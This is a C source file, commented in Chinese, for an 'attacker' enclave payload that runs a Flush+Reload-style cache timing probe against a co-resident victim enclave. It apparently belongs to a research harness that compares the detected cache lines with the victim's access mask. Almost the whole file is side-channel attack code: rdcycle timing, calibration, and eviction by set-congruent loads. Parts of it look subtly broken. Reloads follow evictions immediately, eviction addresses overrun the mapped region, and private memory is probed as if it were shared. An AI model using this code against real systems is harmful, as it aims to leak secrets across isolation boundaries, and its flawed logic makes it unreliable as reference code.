/* attacker_cache_payload.c - 跨飞地缓存侧信道: attacker 飞地载荷
 *
 * 运行在飞地 U-mode 内, 在 victim 飞地仍存活时执行。
 * attacker 不了解 victim 的算法、数据或访问模式,
 * 纯粹通过 Flush+Reload (rdcycle 计时) 探测 L2 缓存状态,
 * 推断哪些缓存行在 victim 运行期间被访问过。
 *
 * 流程:
 *   1. mmap 与 victim 相同的 VA 区域
 *   2. 校准: 测量 cache hit 与 miss 的 rdcycle 阈值
 *   3. 对每个探测行: eviction-based flush -> reload 计时 -> 判定 hit/miss
 *   4. 输出探测结果 (detected mask), 供宿主与 victim 的 access_mask 比对
 *
 * 编译: 见 Makefile (musl 飞地编译链)
 * SPDX-License-Identifier: GPL-2.0
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

#define PROBE_VA	0x20000000UL
#define CACHE_LINE	64
#define L2_SETS		1024
#define L2_WAYS		4
#define STRIDE		(L2_SETS * CACHE_LINE) /* 64 KiB */
#define PROBE_LINES 16
#define EVICT_COUNT 8 /* > L2_WAYS 以确保逐出 */
#define CALIBRATE_N 50

/* ---- 硬件原语 ---- */

static inline void fence_all(void) {
	__asm__ volatile("fence iorw, iorw" ::: "memory");
}

/* ---- 缓存逐出 (eviction-based flush) ----
 *
 * 访问 EVICT_COUNT 个与 target 同缓存组 (set-congruent) 的地址,
 * stride = L2_SETS * CACHE_LINE 确保映射到同一 set,
 * 利用 L2 4-way 组相联特性将 target 所在缓存行逐出。
 */
static void flush_line(volatile char *target) {
	for (int i = 0; i < EVICT_COUNT; i++) {
		volatile char *evict = target + (size_t)(i + 1) * STRIDE;
		__asm__ volatile("lb zero, 0(%0)" : : "r"(evict) : "memory");
	}
	fence_all();
}

/* ---- reload 计时 ----
 *
 * rdcycle -> load -> rdcycle, 差值即该次访存的周期数。
 */
static uint64_t reload_time(volatile char *target) {
	uint64_t t0, t1;
	__asm__ volatile("fence iorw, iorw\n\t"
					 "rdcycle %0\n\t"
					 "lb zero, 0(%2)\n\t"
					 "rdcycle %1\n\t"
					 : "=r"(t0), "=r"(t1)
					 : "r"(target)
					 : "memory");
	return t1 - t0;
}

int main(void) {
	size_t probe_sz = (size_t)PROBE_LINES * STRIDE; /* 1 MiB */

	void *addr = mmap(
		(void *)PROBE_VA,
		probe_sz,
		PROT_READ | PROT_WRITE,
		MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
		-1,
		0);
	if (addr == MAP_FAILED) {
		printf("[attacker] mmap failed\n");
		return 1;
	}
	memset(addr, 0, probe_sz);

	/* ---- 阈值校准 ---- */
	uint64_t hit_sum = 0, miss_sum = 0;

	for (int i = 0; i < CALIBRATE_N; i++) {
		volatile char *line = (volatile char *)addr;
		__asm__ volatile("lb zero, 0(%0)" : : "r"(line) : "memory");
		fence_all();
		hit_sum += reload_time(line);
	}
	for (int i = 0; i < CALIBRATE_N; i++) {
		volatile char *line = (volatile char *)addr;
		flush_line(line);
		miss_sum += reload_time(line);
	}

	uint64_t hit_avg   = hit_sum / CALIBRATE_N;
	uint64_t miss_avg  = miss_sum / CALIBRATE_N;
	uint64_t threshold = (hit_avg + miss_avg) / 2;
	if (threshold == 0) {
		threshold = 1;
	}

	printf(
		"[attacker] calibration: hit_avg=%lu miss_avg=%lu threshold=%lu\n",
		(unsigned long)hit_avg,
		(unsigned long)miss_avg,
		(unsigned long)threshold);

	/* ---- 探测各缓存行 (attacker 不知道 victim 的访问模式) ---- */
	uint16_t detected_mask = 0;

	for (int i = 0; i < PROBE_LINES; i++) {
		volatile char *line = (volatile char *)addr + (size_t)i * STRIDE;

		flush_line(line);
		uint64_t cycles = reload_time(line);
		int hit			= (cycles < threshold) ? 1 : 0;

		if (hit) {
			detected_mask |= (uint16_t)(1u << i);
		}

		printf(
			"[attacker] line[%2d]: cycles=%6lu  %s\n",
			i,
			(unsigned long)cycles,
			hit ? "HIT" : "miss");
	}

	int detected_bits = __builtin_popcount((unsigned)detected_mask);
	printf(
		"[attacker] detected_mask=0x%04x  detected_bits=%d/%d\n",
		(unsigned)detected_mask,
		detected_bits,
		PROBE_LINES);
	printf("[attacker] probing complete.\n");

	return 0;
}
